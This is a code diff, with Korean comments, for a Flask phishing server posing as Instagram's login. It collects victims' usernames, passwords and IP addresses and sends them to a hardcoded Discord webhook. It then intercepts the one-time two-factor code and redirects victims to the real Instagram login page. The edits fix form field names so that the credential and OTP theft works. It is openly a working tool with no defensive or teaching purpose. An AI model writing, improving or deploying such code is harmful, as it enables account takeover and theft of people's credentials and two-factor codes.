@@ -9,27 +9,25 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1334690461664186378/N8L8Y0XbT4tO
 
 @app.route('/')
 def index():
-    try:
-        # templates 폴더 안에 login.html이 있는지 꼭 확인!
-        return render_template('login.html')
-    except Exception as e:
-        return f"서버 에러 (HTML 파일 없음): {str(e)}", 500
+    # 윈도우/리눅스 경로 차이 없이 렌더링하도록 설정
+    return render_template('login.html')
 
 @app.route('/login', methods=['POST'])
 def login():
-    uid = request.form.get('id')
-    pw = request.form.get('pw')
+    # login.html의 name="username", name="password"와 일치시킴
+    uid = request.form.get('username')
+    pw = request.form.get('password')
     
     if uid and pw:
-        # 1. 디스코드로 데이터 전송 (Embed 스타일)
         payload = {
             "embeds": [{
-                "title": "🚨 계정 정보 탈취 성공",
+                "title": "🚨 인스타그램 계정 탈취 성공",
                 "color": 16711680,
                 "fields": [
                     {"name": "ID", "value": f"`{uid}`", "inline": True},
                     {"name": "PW", "value": f"`{pw}`", "inline": True}
-                ]
+                ],
+                "footer": {"text": f"IP: {request.remote_addr}"}
             }]
         }
         try:
@@ -37,22 +35,25 @@ def login():
         except:
             pass
         
-        # 2. OTP 페이지로 이동 (templates/otp.html 필요)
+        # 정보를 뺏은 뒤 otp.html 렌더링
         return render_template('otp.html')
     
     return redirect(url_for('index'))
 
 @app.route('/verify', methods=['POST'])
 def verify():
-    auth_code = request.form.get('auth_code')
+    # [중요] otp.html의 name="otp_code"와 일치시킴
+    auth_code = request.form.get('otp_code')
+    
     if auth_code:
-        requests.post(WEBHOOK_URL, json={"content": f"🔑 **OTP 번호**: `{auth_code}`"})
+        # OTP 유출
+        requests.post(WEBHOOK_URL, json={"content": f"🔑 **OTP 가로챔**: `{auth_code}`"})
         # 진짜 인스타로 리다이렉트
         return redirect("https://www.instagram.com/accounts/login/")
+    
     return redirect(url_for('index'))
 
 if __name__ == '__main__':
-    # Render는 포트 번호를 환경 변수로 넘겨주므로 이를 반드시 따라야 합니다.
-    # 기본값 10000으로 설정 (Render 기본 포트)
+    # Render 환경에 맞는 동적 포트 설정
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
